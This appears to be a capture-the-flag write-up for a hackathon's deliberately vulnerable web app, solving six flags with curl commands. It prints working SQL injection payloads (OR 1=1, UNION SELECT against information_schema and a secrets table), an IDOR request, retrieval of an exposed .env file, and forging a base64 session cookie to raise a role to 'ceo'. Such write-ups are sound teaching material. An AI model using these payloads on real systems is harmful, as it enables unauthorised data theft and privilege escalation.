# Flag 1
The first flag we found was in the frontpage HEAD section as a comment, it is fairly easy to find.

```bash
curl -s http://team54-honeypot.durhack.qwerty.technology:8080/ | grep -oP "FLAG\{.*?\}"
```

Outputs: FLAG{source_code_never_lies}

# Flag 2
Our attention was next drawn to the login form, we assumed there was a possible SQL injection, so we tried that first, doing the common `'OR 1=1 --` strategy, revealed that indeed the form had SQL injection, and also leaked out the data to us. 

```bash
curl -s -d "username=' OR 1=1 -- &password=" http://team54-honeypot.durhack.qwerty.technology:8080/login \
    | sed -n "112p" # to only output the affected line
```

We then tried to find out the tables, which we found a secret table in:
```bash
curl -sd "username=' UNION SELECT null, table_name, column_name FROM information_schema.columns WHERE table_schema=database() -- -&password=test" \
    http://team54-honeypot.durhack.qwerty.technology:8080/login \
| grep users\nsecrets
```

So we outputted the data from there
```bash
curl -sd "username=' UNION SELECT id, secret_key, secret_value FROM secrets -- &password=test" \
    http://team54-honeypot.durhack.qwerty.technology:8080/login \
| grep -oP "FLAG\{.*?\}"
```

Outputs: FLAG{union_based_injection_reveals_secrets}


# Generating a valid login session
We also found a users table, which included one user with a plain text password (while the rest were hashed),
using this we logged in with that - for future commands, we also generate a session.txt file to make it easier:

elliot\_4430: elliot\_4430

We can also take note of the other user id's we got from here to forge requests later.


```bash
curl -sc session.txt -d "username=elliot_4430&password=elliot_4430" \
    http://team54-honeypot.durhack.qwerty.technology:8080/login
```


# Flag 3
Request another user’s dashboard directly by altering the `userid` parameter, we found these a tiny bit ago.

This flag is then in the personal notes.

```bash
curl -sb session.txt \
    "http://team54-honeypot.durhack.qwerty.technology:8080/dashboard?userid=8080" \
| grep -oP "FLAG\{.*?\}"
```


Outputs: FLAG{direct_access_via_idor_parameter}


# Flag 4
Checking for common paths revealed a `robots.txt`, and also a `.env` file, in this env file there was a flag in plaintext.

```bash
curl -s http://team54-honeypot.durhack.qwerty.technology:8080/.env | grep -oP "FLAG\{.*?\}"
```

Outputs: FLAG{dotenv_exposure_via_directory_traversal}


# Flag 5
Now pivoting back to the page, since we found the `robots.txt`, we had a clue on potential filenames, it allowed us to download the draft, but not the final version (as that required CEO permission)

This contained the next flag.

```bash
curl -sb session.txt "http://team54-honeypot.durhack.qwerty.technology:8080/download?file=2025-Q3-draft.pdf" \
| grep -oP "FLAG\{.*?\}" # works, but we found it by just opening the PDF
```



# Flag 6 cookies
Since we had a clue that we were missing permissions from trying to access `2025-Q3.pdf`, we turned to the session cookies, where we discovered that our auth data looks kind of like base64, which we then confirmed, doing this showed that it just is a JSON blob with includes a role field, changing this field to be `ceo` instead of `trader` provided us with access to this final file, which also had the final key.

```bash
grep -oP "auth_data(.*)" < session.txt | cut -f 2 | base64 -d \
# {"user_id":4430,"username":"elliot_4430","role":"trader"}
| sed "s/trader/ceo/" \
# {"user_id":4430,"username":"elliot_4430","role":"ceo"}
| base64

# THEN
# manually replace the base64 auth_data key in session.txt (i was too lazy to come up with a command for this)

curl -sb session.txt "http://team54-honeypot.durhack.qwerty.technology:8080/download?file=2025-Q3.pdf" \
| grep -oP "FLAG\{.*?\}" # works, but we found it by just opening the PDF
```

Outputs: FLAG{admin_access_confirmed_privilege_escalation_successful}
